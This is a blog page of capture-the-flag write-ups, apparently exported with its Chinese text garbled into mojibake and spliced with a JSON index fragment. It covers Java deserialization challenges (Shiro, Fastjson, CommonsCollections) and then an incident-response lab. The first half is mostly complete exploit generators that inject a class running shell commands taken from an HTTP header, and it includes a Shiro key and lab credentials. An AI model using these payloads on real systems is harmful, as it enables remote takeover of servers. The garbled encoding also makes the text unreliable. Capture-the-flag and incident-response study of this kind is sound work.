é™¤æ­¤ä¹‹å¤–ï¼Œå‘ç°ç›´æ¥è¯»/actuator/envå°±èƒ½å‘ç°flagï¼š å°è¯•äº¤äº†ä¸€éå‘ç°æ˜¯ä¸ªå‡flagã€‚ã€‚ã€‚ã€‚é‚£å°±åªèƒ½ç»§ç»­å¾€ä¸‹åšäº†ï¼Œå…ˆéªŒè¯ä¸€ä¸‹keyï¼š æœ¬é¢˜çš„keyæ˜¯FBLIB5s/7pnNDrYGF3+1og==ï¼Œå½“ç„¶è‚¯å®šæ˜¯æ¯ä¸ªå®¹å™¨éƒ½ä¸ä¸€æ ·ï¼Œè¿˜æ˜¯è‡ªå·±å°è¯•ä¸€ä¸‹å§ ä¹‹åå‡ºé¢˜äººè¯´è¦ç”¨payloadåœ¨3000ä»¥å†…çš„ï¼Œé‚£æˆ‘ä»¬å°±ç›´æ¥æŠŠä¸Šè¾¹PolarOAé‚£ä¸ªç¼©çŸ­ç‰ˆæ‹¿è¿‡æ¥å°±å¥½äº†ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576package shiropoc;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import javassist.*;import org.apache.commons.beanutils.BeanComparator;import org.apache.shiro.codec.CodecSupport;import org.apache.shiro.crypto.AesCipherService;import java.io.ByteArrayOutputStream;import java.io.FileOutputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.util.PriorityQueue;public class POC_aesgcm_short &#123; public static void main(String[] args) throws Exception &#123; com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl templates = getTemplate(); final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER); final PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2, comparator); // stub data for replacement later queue.add(&quot;1&quot;); queue.add(&quot;1&quot;); setFieldValue(comparator, &quot;property&quot;, &quot;outputProperties&quot;); setFieldValue(queue, &quot;queue&quot;, new Object[]&#123;templates, templates&#125;); ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(queue); AesCipherService aes = new AesCipherService(); byte[] key = java.util.Base64.getDecoder().decode(CodecSupport.toBytes(&quot;HeWlhWC2OauL4D1HjGqHDw==&quot;));//shiroå¯†é’¥ byte[] bytes = byteArrayOutputStream.toByteArray(); System.out.println(aes.encrypt(bytes, key)); &#125; public static CtClass genPayloadForLinux() throws CannotCompileException, NotFoundException &#123; ClassPool classPool = ClassPool.getDefault(); CtClass clazz = classPool.makeClass(&quot;A&quot;); if ((clazz.getDeclaredConstructors()).length != 0) &#123; clazz.removeConstructor(clazz.getDeclaredConstructors()[0]); &#125; clazz.addConstructor(CtNewConstructor.make(&quot;public B() throws Exception &#123;\\n&quot; + &quot; org.springframework.web.context.request.RequestAttributes requestAttributes = org.springframework.web.context.request.RequestContextHolder.getRequestAttributes();\\n&quot; + &quot; javax.servlet.http.HttpServletRequest httprequest = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getRequest();\\n&quot; + &quot; javax.servlet.http.HttpServletResponse httpresponse = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getResponse();\\n&quot; + &quot; String[] cmd = new String[]&#123;\\&quot;sh\\&quot;, \\&quot;-c\\&quot;, httprequest.getHeader(\\&quot;C\\&quot;)&#125;;\\n&quot; + &quot; byte[] result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter(\\&quot;\\\\\\\\A\\&quot;).next().getBytes();\\n&quot; + &quot; httpresponse.getWriter().write(new String(result));\\n&quot; + &quot; httpresponse.getWriter().flush();\\n&quot; + &quot; httpresponse.getWriter().close();\\n&quot; + &quot; &#125;&quot;, clazz)); // å…¼å®¹ä½ç‰ˆæœ¬jdk clazz.getClassFile().setMajorVersion(50); CtClass superClass = classPool.get(AbstractTranslet.class.getName()); clazz.setSuperclass(superClass); return clazz; &#125; public static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl getTemplate() throws Exception &#123; CtClass clz = genPayloadForLinux(); com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl obj = new com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl(); setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]&#123;clz.toBytecode()&#125;); setFieldValue(obj, &quot;_name&quot;, &quot;a&quot;); setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl()); return obj; &#125; public static void setFieldValue(Object obj, String fieldName, Object fieldValue) throws NoSuchFieldException, IllegalAccessException &#123; Class clazz = obj.getClass(); Field classField = clazz.getDeclaredField(fieldName); classField.setAccessible(true); classField.set(obj, fieldValue); &#125;&#125; ä½†è¿™é‡Œå†å¾€åå°±ç‰µæ‰¯åˆ°ä¸€ä¸ªç‰ˆæœ¬é—®é¢˜äº†ï¼Œä»/actuator/logfileèƒ½å¤Ÿå‘ç°å…¶shiroç‰ˆæœ¬ä¸º1.8.0ï¼š é™¤æ­¤ä¹‹å¤–æˆ‘ä»¬è¿˜éœ€è¦çŸ¥é“CBä¾èµ–çš„ç‰ˆæœ¬ï¼Œä¸ç„¶å°±ä¼šæŠ¥é”™ï¼Œç»è¿‡æœç´¢shiro1.8.0å¯¹åº”çš„CBä¾èµ–ç‰ˆæœ¬æ˜¯1.9.4ï¼Œç„¶åæ‰“å°±å®Œäº†ï¼š ï¼ˆæœ¬é¢˜æˆ‘åœ¨ç½‘ä¸Šçœ‹äº†çœ‹ï¼Œé™¤äº†å‡ºé¢˜äººçš„WPä¹‹å¤–å°±æ²¡æœ‰äº†ï¼Œé‡Œè¾¹å†™çš„æ—¶å€™ä¹Ÿæ²¡æåˆ°ç‰ˆæœ¬é—®é¢˜ï¼Œå½“æ—¶åšçš„æ—¶å€™å°±å¡åœ¨è¿™é‡ŒåŠ¨ä¸äº†äº†ï¼Œè¿˜å¥½æƒ³èµ·æ¥äº†ç‰ˆæœ¬çš„äº‹æƒ…â€¦ï¼‰ Fastjsonæ‰“å¼€é¢˜ç›®ä¸€çœ‹æ˜¯è¿™ä¸ªï¼š çœ‹ä¸€ä¸‹æºç ï¼š å†çœ‹ä¸€ä¸‹fastjsonçš„ç‰ˆæœ¬ï¼š çœ‹èµ·æ¥å°±ä¸€ä¸ªç®€å•çš„fastjsonæ¼æ´çš„åˆ©ç”¨ï¼Œè¿ä¸ªè¿‡æ»¤éƒ½æ²¡æœ‰ï¼Œå› ä¸ºé¢˜ç›®ä¸å‡ºç½‘ï¼Œæˆ‘ä»¬ç”¨TemplatesImplæ‰“å°±å®Œäº†ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142package fastjson;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import javassist.*;import java.io.IOException;public class Test &#123; public static void main(String[] args) throws NotFoundException, CannotCompileException, IOException &#123; CtClass clz = genPayloadForLinux(); String byteCode = java.util.Base64.getEncoder().encodeToString(clz.toBytecode()); //æ„é€ TemplatesImplçš„jsonæ•°æ®ï¼Œå¹¶å°†æ¶æ„ç±»æ³¨å…¥åˆ°jsonæ•°æ®ä¸­ final String NASTY_CLASS = &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;; String payload = &quot;&#123;\\&quot;@type\\&quot;:\\&quot;&quot; + NASTY_CLASS + &quot;\\&quot;,\\&quot;_bytecodes\\&quot;:[\\&quot;&quot;+byteCode+&quot;\\&quot;],&quot; + &quot;&#x27;_name&#x27;:&#x27;TempletaPoc&#x27;,&quot; + &quot;&#x27;_tfactory&#x27;:&#123;&#125;,&quot; + &quot;\\&quot;_outputProperties\\&quot;:&#123;&#125;&#125;\\n&quot;; System.out.println(payload); &#125; public static CtClass genPayloadForLinux() throws CannotCompileException, NotFoundException &#123; ClassPool classPool = ClassPool.getDefault(); CtClass clazz = classPool.makeClass(&quot;A&quot;); if ((clazz.getDeclaredConstructors()).length != 0) &#123; clazz.removeConstructor(clazz.getDeclaredConstructors()[0]); &#125; clazz.addConstructor(CtNewConstructor.make(&quot;public B() throws Exception &#123;\\n&quot; + &quot; org.springframework.web.context.request.RequestAttributes requestAttributes = org.springframework.web.context.request.RequestContextHolder.getRequestAttributes();\\n&quot; + &quot; javax.servlet.http.HttpServletRequest httprequest = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getRequest();\\n&quot; + &quot; javax.servlet.http.HttpServletResponse httpresponse = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getResponse();\\n&quot; + &quot; String[] cmd = new String[]&#123;\\&quot;sh\\&quot;, \\&quot;-c\\&quot;, httprequest.getHeader(\\&quot;C\\&quot;)&#125;;\\n&quot; + &quot; byte[] result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter(\\&quot;\\\\\\\\A\\&quot;).next().getBytes();\\n&quot; + &quot; httpresponse.getWriter().write(new String(result));\\n&quot; + &quot; httpresponse.getWriter().flush();\\n&quot; + &quot; httpresponse.getWriter().close();\\n&quot; + &quot; &#125;&quot;, clazz)); // å…¼å®¹ä½ç‰ˆæœ¬jdk clazz.getClassFile().setMajorVersion(50); CtClass superClass = classPool.get(AbstractTranslet.class.getName()); clazz.setSuperclass(superClass); return clazz; &#125;&#125; ç›´æ¥å‘½ä»¤æ‰§è¡Œè¯»flagï¼š ezJsonæºç çœ‹ä¸€ä¸‹ï¼š å†çœ‹çœ‹ä¾èµ–ï¼š çœ‹èµ·æ¥èƒ½ç›´æ¥æ‰“fastjson1.2.83é«˜ç‰ˆæœ¬ç»•è¿‡ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980package fastjson;import com.alibaba.fastjson.JSONArray;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import javassist.*;import javax.management.BadAttributeValueExpException;import java.io.*;import java.lang.reflect.Field;import java.util.Base64;import java.util.HashMap;public class Fastjson83 &#123; public static void setFieldValue(Object obj, String fieldName, Object fieldValue) throws NoSuchFieldException, IllegalAccessException &#123; Class clazz = obj.getClass(); Field classField = clazz.getDeclaredField(fieldName); classField.setAccessible(true); classField.set(obj, fieldValue); &#125; public static CtClass genPayloadForLinux() throws CannotCompileException, NotFoundException &#123; ClassPool classPool = ClassPool.getDefault(); CtClass clazz = classPool.makeClass(&quot;A&quot;); if ((clazz.getDeclaredConstructors()).length != 0) &#123; clazz.removeConstructor(clazz.getDeclaredConstructors()[0]); &#125; clazz.addConstructor(CtNewConstructor.make(&quot;public B() throws Exception &#123;\\n&quot; + &quot; org.springframework.web.context.request.RequestAttributes requestAttributes = org.springframework.web.context.request.RequestContextHolder.getRequestAttributes();\\n&quot; + &quot; javax.servlet.http.HttpServletRequest httprequest = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getRequest();\\n&quot; + &quot; javax.servlet.http.HttpServletResponse httpresponse = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getResponse();\\n&quot; + &quot; String[] cmd = new String[]&#123;\\&quot;sh\\&quot;, \\&quot;-c\\&quot;, httprequest.getHeader(\\&quot;C\\&quot;)&#125;;\\n&quot; + &quot; byte[] result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter(\\&quot;\\\\\\\\A\\&quot;).next().getBytes();\\n&quot; + &quot; httpresponse.getWriter().write(new String(result));\\n&quot; + &quot; httpresponse.getWriter().flush();\\n&quot; + &quot; httpresponse.getWriter().close();\\n&quot; + &quot; &#125;&quot;, clazz)); // å…¼å®¹ä½ç‰ˆæœ¬jdk clazz.getClassFile().setMajorVersion(50); CtClass superClass = classPool.get(AbstractTranslet.class.getName()); clazz.setSuperclass(superClass); return clazz; &#125; public static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl getTemplate() throws Exception &#123; CtClass clz = genPayloadForLinux(); com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl obj = new com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl(); setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]&#123;clz.toBytecode()&#125;); setFieldValue(obj, &quot;_name&quot;, &quot;a&quot;); setFieldValue(obj, &quot;_tfactory&quot;, null); return obj; &#125; public static void main(String[] args) throws Exception&#123; com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl templates = getTemplate(); JSONArray jsonArray = new JSONArray(); jsonArray.add(templates); BadAttributeValueExpException bd = new BadAttributeValueExpException(null); setFieldValue(bd,&quot;val&quot;,jsonArray); HashMap hashMap = new HashMap(); hashMap.put(templates,bd); ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(hashMap); objectOutputStream.close(); byte[] serialize = byteArrayOutputStream.toByteArray(); System.out.println(Base64.getEncoder().encodeToString(serialize));// ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(byteArrayOutputStream.toByteArray()));// objectInputStream.readObject(); &#125;&#125; æ‰“å°±å®Œäº† CCé“¾ ç›´æ¥æ‰“CCé“¾å°±è¡Œäº†ï¼Œä¸‹è¾¹æ˜¯CC3ã€CC6å’ŒCC2çš„é›†åˆï¼ˆæˆ‘ç›´æ¥æ‰“CC3æˆ–è€…CC2æ‰“ä¸é€šï¼‰ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import javassist.*;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InstantiateTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import javax.xml.transform.Templates;import javax.xml.transform.TransformerConfigurationException;import java.io.*;import java.lang.annotation.Target;import java.lang.reflect.*;import java.nio.file.Files;import java.nio.file.Paths;import java.util.Base64;import java.util.HashMap;import java.util.Map;public class CC &#123; public static void main(String[] args) throws Exception &#123; com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl templates = getTemplate(); InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;newTransformer&quot;, null, null); HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;(); Map&lt;Object,Object&gt; innerMap = LazyMap.decorate(map, new ConstantTransformer(1)); TiedMapEntry tiedMapEntry = new TiedMapEntry(innerMap, templates); HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;(); hashMap.put(tiedMapEntry, &quot;bbb&quot;); innerMap.remove(templates); Class c = LazyMap.class; Field factoryField = c.getDeclaredField(&quot;factory&quot;); factoryField.setAccessible(true); factoryField.set(innerMap,invokerTransformer); ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(hashMap); objectOutputStream.close(); byte[] serialize = byteArrayOutputStream.toByteArray(); System.out.println(Base64.getEncoder().encodeToString(serialize)); &#125; public static void setFieldValue(Object obj, String fieldName, Object fieldValue) throws NoSuchFieldException, IllegalAccessException &#123; Class clazz = obj.getClass(); Field classField = clazz.getDeclaredField(fieldName); classField.setAccessible(true); classField.set(obj, fieldValue); &#125; public static CtClass genPayloadForLinux() throws CannotCompileException, NotFoundException &#123; ClassPool classPool = ClassPool.getDefault(); CtClass clazz = classPool.makeClass(&quot;A&quot;); if ((clazz.getDeclaredConstructors()).length != 0) &#123; clazz.removeConstructor(clazz.getDeclaredConstructors()[0]); &#125; clazz.addConstructor(CtNewConstructor.make(&quot;public B() throws Exception &#123;\\n&quot; + &quot; org.springframework.web.context.request.RequestAttributes requestAttributes = org.springframework.web.context.request.RequestContextHolder.getRequestAttributes();\\n&quot; + &quot; javax.servlet.http.HttpServletRequest httprequest = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getRequest();\\n&quot; + &quot; javax.servlet.http.HttpServletResponse httpresponse = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getResponse();\\n&quot; + &quot; String[] cmd = new String[]&#123;\\&quot;sh\\&quot;, \\&quot;-c\\&quot;, httprequest.getHeader(\\&quot;C\\&quot;)&#125;;\\n&quot; + &quot; byte[] result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter(\\&quot;\\\\\\\\A\\&quot;).next().getBytes();\\n&quot; + &quot; httpresponse.getWriter().write(new String(result));\\n&quot; + &quot; httpresponse.getWriter().flush();\\n&quot; + &quot; httpresponse.getWriter().close();\\n&quot; + &quot; &#125;&quot;, clazz)); // å…¼å®¹ä½ç‰ˆæœ¬jdk clazz.getClassFile().setMajorVersion(50); CtClass superClass = classPool.get(AbstractTranslet.class.getName()); clazz.setSuperclass(superClass); return clazz; &#125; public static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl getTemplate() throws Exception &#123; CtClass clz = genPayloadForLinux(); com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl obj = new com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl(); setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]&#123;clz.toBytecode()&#125;); setFieldValue(obj, &quot;_name&quot;, &quot;a&quot;); setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl()); return obj; &#125;&#125; FastJsonBCEL","categories":[],"tags":[]},{"title":"åº”æ€¥å“åº”é¶åœºè®­ç»ƒWP","slug":"åº”æ€¥å“åº”é¶åœºè®­ç»ƒWP","date":"2024-05-28T03:44:27.530Z","updated":"2024-05-30T03:31:26.164Z","comments":true,"path":"2024/05/28/åº”æ€¥å“åº”é¶åœºè®­ç»ƒWP/","link":"","permalink":"http://example.com/2024/05/28/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83WP/","excerpt":"ä½œè€…ï¼šNarcher æ—¶é—´ï¼š2024&#x2F;5&#x2F;28 åˆ†ç±»ï¼šwriteup","text":"ä½œè€…ï¼šNarcher æ—¶é—´ï¼š2024&#x2F;5&#x2F;28 åˆ†ç±»ï¼šwriteup å‰è¨€è‡ªå·±è¿™ä¸€å—ä¸€ç›´æ˜¯ä¸ªç¼ºå£ï¼Œè™½è¯´é¶åœºé’ˆå¯¹çš„äº‹ä»¶ä¸æ˜¯å¾ˆå…¨ï¼Œä½†ä¹Ÿç®—èƒ½æŸ¥æ¼è¡¥ç¼ºä¸€éƒ¨åˆ†äº† æ­£æ–‡åº”æ€¥å“åº”é¶æœºâ€“Linux(1)æŒ‘æˆ˜å†…å®¹å‰æ™¯éœ€è¦ï¼šå°ç‹æ€¥åŒ†åŒ†åœ°æ‰¾åˆ°å°å¼ ï¼Œå°ç‹è¯´â€œæå“¥ï¼Œæˆ‘devæœåŠ¡å™¨è¢«é»‘äº†â€ï¼Œå¿«æ•‘æ•‘æˆ‘ï¼ï¼ æŒ‘æˆ˜å†…å®¹ï¼š é»‘å®¢çš„IPåœ°å€ é—ç•™ä¸‹çš„ä¸‰ä¸ªflag å‡­æ®ï¼šroot&#x2F;defend defend&#x2F;defend è§£é¢˜1.æŸ¥çœ‹å½“å‰ä¸»æœºæœ€è¿‘çš„ç”¨æˆ·ç™»å½•æƒ…å†µï¼š 1sudo grep &quot;Accepted&quot; /var/log/secure* | awk &#x27;&#123;print $1,$2,$3,$9,$11&#125;&#x27; å¯è§ä¹‹å‰æœ‰ä¸€ä¸ªä»¥rootèº«ä»½ç™»å½•çš„ipï¼Œæ­¤ä¸ºé»‘å®¢çš„ipåœ°å€ 2.è¿›å…¥rootæƒé™ï¼Œsudo -s æŸ¥çœ‹å†å²å‘½ä»¤historyï¼Œå‘ç°ç¬¬ä¸€ä¸ªflagï¼š ä»é»‘å®¢æ‰§è¡Œçš„å†å²å‘½ä»¤ä¸­æˆ‘ä»¬å¯ä»¥çœ‹å‡ºé»‘å®¢æ›´æ”¹äº†rc.localæ–‡ä»¶ï¼Œæˆ‘ä»¬ç›´æ¥catæŸ¥çœ‹å…·ä½“å†…å®¹ï¼š è·å–åˆ°ç¬¬äºŒä¸ªflag 3.æ­¤æ—¶ï¼Œé»‘å®¢ä»¥åŠå®Œæˆäº†rootæƒé™çš„è·å–ä»¥åŠæƒé™ç»´æŒçš„æ“ä½œï¼ŒåŸºæœ¬ä¸Šå°±ç»“æŸäº†ï¼Œæˆ‘ä»¬å»çœ‹çœ‹é»‘å®¢æ˜¯æ€ä¹ˆæ‰“è¿›æ¥çš„ åœ¨cat /etc/passwdçš„æ—¶å€™å‘ç°å­˜åœ¨redisæœåŠ¡ï¼ŒçŒœæµ‹å­˜åœ¨redisæœªæˆæƒæ¼æ´ï¼Œæˆ‘ä»¬æ¥æµ‹è¯•ä¸€ä¸‹ï¼š å¯è§å¼€å¯æœåŠ¡åç›´æ¥ç™»å½•æˆåŠŸï¼Œæˆ‘ä»¬å»æŸ¥çœ‹redisé…ç½®æ–‡ä»¶ï¼Œcat /etc/redis.confï¼š è·å–åˆ°ç¬¬ä¸‰ä¸ªflag æˆ–è€…æˆ‘ä»¬è¿˜èƒ½å»æŸ¥çœ‹ä¸€ä¸‹å†å²ä¿®æ”¹çš„æ–‡ä»¶ï¼Œrpm -Vf /usr/bin/*ï¼ˆæ„Ÿè§‰è¿™ä¸ªå‘½ä»¤å¾ˆæœ‰ç”¨ï¼‰ï¼š ä»ä¸Šè¾¹ä¹Ÿèƒ½çœ‹åˆ°é»‘å®¢æ›¾ç»ä¿®æ”¹è¿‡çš„æ–‡ä»¶ åˆ°äº†è¿™æ­¥å¹¶æœªç»“æŸï¼Œæˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡redisçš„è¿æ¥æ—¥å¿—å»åæ¨é»‘å®¢çš„ipåœ°å€ï¼Œå…ˆæŸ¥çœ‹ä¸€ä¸‹redisæ—¥å¿—æ–‡ä»¶ç­‰çº§ï¼š å‘ç°ä¸ºverboseï¼Œé‚£ä¹ˆå°±ä¼šåŒ…å«ç€è¯·æ±‚å’Œå“åº”çš„å†…å®¹ï¼Œé»‘å®¢ä»è¿™é‡Œæ‰“è¿›æ¥å°±å¿…ç„¶ä¼šæœ‰è®°å½• æˆ‘ä»¬å»æŸ¥çœ‹redisçš„æ—¥å¿—æ–‡ä»¶ å‘ç°é»‘å®¢ipä¸º192.168.75.129 åˆ°äº†è¿™ä¸€æ­¥ï¼Œè¿™ä¸ªé¶æœºå°±åŸºæœ¬ä¸Šç»“æŸäº† åº”æ€¥å“åº”é¶æœºâ€“Linux(2)æŒ‘æˆ˜å†…å®¹å‰æ™¯éœ€è¦ï¼šçœ‹ç›‘æ§çš„æ—¶å€™å‘ç°webshellå‘Šè­¦ï¼Œé¢†å¯¼è®©ä½ ä¸Šæœºæ£€æŸ¥ä½ å¯ä»¥æ•‘æ•‘å®‰æœä»”å—ï¼ï¼ æŒ‘æˆ˜å†…å®¹ï¼š 1,æäº¤æ”»å‡»è€…IP 2,æäº¤æ”»å‡»è€…ä¿®æ”¹çš„ç®¡ç†å‘˜å¯†ç (æ˜æ–‡) 3,æäº¤ç¬¬ä¸€æ¬¡Webshellçš„è¿æ¥URL(http://xxx.xxx.xxx.xx/abcdefg?abcdefgåªéœ€è¦æäº¤abcdefg?abcdefg) 3,æäº¤Webshellè¿æ¥å¯†ç  4,æäº¤æ•°æ®åŒ…çš„flag1 5,æäº¤æ”»å‡»è€…ä½¿ç”¨çš„åç»­ä¸Šä¼ çš„æœ¨é©¬æ–‡ä»¶åç§° 6,æäº¤æ”»å‡»è€…éšè—çš„flag2 7,æäº¤æ”»å‡»è€…éšè—çš„flag3 å‡­æ®ï¼šroot&#x2F;Inch@957821. ï¼ˆæ³¨æ„å¯†ç ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸ºå¤§å†™çš„iï¼‰ è§£é¢˜å› ä¸ºæ¶‰åŠå®å¡”çš„ç¼–ç é—®é¢˜ï¼Œè€Œé¶æœºæ­£å¥½å¼€æ”¾äº†22ç«¯å£ï¼Œæˆ‘å°±ç›´æ¥ç”¨sshè¿æ¥äº† 1.é¦–å…ˆå»æŸ¥çœ‹å½“å‰ä¸»æœºçš„ç”¨æˆ·ç™»å½•æƒ…å†µï¼š 1sudo grep &quot;Accepted&quot; /var/log/secure* | awk &#x27;&#123;print $1,$2,$3,$9,$11&#125;&#x27; 192.168.58.1æ˜¯æˆ‘æœ¬æœºipï¼Œé‚£ä¹ˆ192.168.20.1å°±æ˜¯é»‘å®¢çš„ipäº† æˆ–è€…ç›´æ¥ç™»å½•å®å¡”ï¼ŒæŸ¥çœ‹æ—¥å¿—ï¼š 2.è‡³äºæ”»å‡»è€…ä¿®æ”¹çš„ç®¡ç†å‘˜å¯†ç (æ˜æ–‡)ï¼Œæˆ‘ä»¬å»æŸ¥çœ‹ä¸€ä¸‹&#x2F;etc&#x2F;passwdï¼š å¯è§å­˜åœ¨mysqlæœåŠ¡ï¼Œå†å»çœ‹çœ‹ç³»ç»Ÿä¸­æ‰€æœ‰TCPå’ŒUDPåè®®çš„ç›‘å¬ç«¯å£ä»¥åŠè¿™äº›ç«¯å£ä¸Šæ´»åŠ¨çš„è¿æ¥å’Œç›¸å…³ç¨‹åºçš„ä¿¡æ¯ï¼š é‚£ä¹ˆç®¡ç†å‘˜çš„å¯†ç ï¼ˆæ˜æ–‡ï¼‰å·®ä¸å¤šå°±æ˜¯mysqlæ•°æ®åº“é‡Œçš„å¯†ç ï¼Œå¹¶ä¸”éœ€è¦md5è§£å¯† ä»å®å¡”æ•°æ®åº“ç•Œé¢è·å–åˆ°æ•°æ®åº“ç”¨æˆ·åå’Œå¯†ç ï¼škaoshi&#x2F;5Sx8mK5ieyLPb84m ç™»å½•æˆåŠŸ ä¹‹åä¾æ¬¡è¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼Œshow databases;ï¼Œuse kaoshi;ï¼Œshow tables;ï¼Œselect * from x2_user;ï¼Œå³å¯è·å–åˆ°ç®¡ç†å‘˜å¯†ç çš„å¯†æ–‡ï¼šf6f6eb5ace977d7e114377cc7098b7e3 ä¹‹åmd5è§£å¯†å³å¯è·å–åˆ°æ˜æ–‡ï¼šNetwork@2020 3.ä¹‹åæ˜¯å»æŸ¥æ‰¾ç¬¬ä¸€æ¬¡Webshellçš„è¿æ¥URLï¼Œæˆ‘ä»¬æŠŠé¶æœºä¸­çš„æµé‡æ–‡ä»¶æ‹¿å‡ºæ¥ç”¨wiresharkåˆ†æä¸€ä¸‹ï¼š ï¼ˆå¾ˆå¥‡æ€ªï¼Œæˆ‘Xftpä¼ è¾“å¤±è´¥äº†ï¼Œäºæ˜¯æˆ‘ç›´æ¥ä»å®å¡”ç•Œé¢é‡Œä¸‹è½½çš„ï¼‰ å¯çœ‹å‡ºæ˜¯index.php?user-app-register 3.ä»ä¸Šå›¾å¯çœ‹å‡ºï¼ŒWebshellè¿æ¥å¯†ç ï¼šNetwork2020 æˆ–è€…ä»å®å¡”ä¸­æ·»åŠ ä¸€ä¸ªåŸŸåè¿›è¡Œphpç½‘ç«™çš„è®¿é—®ï¼Œä»åå°å¯çœ‹åˆ°ï¼š 4.æŸ¥æ‰¾æäº¤æ•°æ®åŒ…çš„flag1ï¼Œç›´æ¥ä»wirsharké‡Œçœ‹æ•°æ®åŒ…1ï¼š å¾—åˆ°flag1ï¼šflag1&#123;Network@_2020_Hack&#125; 5.è‡³äºæ”»å‡»è€…ä½¿ç”¨çš„åç»­ä¸Šä¼ çš„æœ¨é©¬æ–‡ä»¶åç§°ï¼Œæ”»å‡»è€…æ—¢ç„¶ä¸Šä¼ äº†è¯¥æœ¨é©¬æ–‡ä»¶ï¼Œé‚£å°±å…«æˆä¼šè®¿é—®ï¼Œæˆ‘ä»¬ç»§ç»­å»çœ‹çœ‹æµé‡åŒ…é‡Œçš„httpæµï¼Œå‘ç°é™¤äº†index.php?user-app-registerä¹‹å¤–ï¼Œè¿˜æœ‰version2.phpï¼Œæˆ‘ä»¬å»æŸ¥çœ‹ä¸€ä¸‹index.php?user-app-registerä¸­POSTçš„å…·ä½“å†…å®¹ï¼š å‘ç°æ˜¯å†°èçš„é©¬ï¼Œä¹‹ååœ¨version2.phpä¸­httpä¼ è¾“çš„éƒ½æ˜¯åŠ å¯†è¿‡çš„æ•°æ®äº† æ•…æ”»å‡»è€…ä½¿ç”¨çš„åç»­ä¸Šä¼ çš„æœ¨é©¬æ–‡ä»¶ä¸ºversion2.php 6.è¦çœ‹éšè—çš„flag2ï¼Œç›´æ¥å»å®å¡”ä¸Šçœ‹æ–‡ä»¶çš„ä¿®æ”¹æ—¥æœŸï¼š å‘ç°å¤šäº†ä¸€ä¸ªå¥‡å¥‡æ€ªæ€ªçš„.apiæ–‡ä»¶å¤¹ï¼Œä¸”å…¶ä¿®æ”¹æ—¶é—´æ­£å¥½å’Œæˆ‘ä»¬åšç¬¬ä¸€é—®çš„æ—¶å€™é»‘å®¢çš„ç™»å½•æ—¶é—´ç›¸ä»¿ï¼Œæ•…çŒœæµ‹flag2åœ¨å…¶ä¸­ 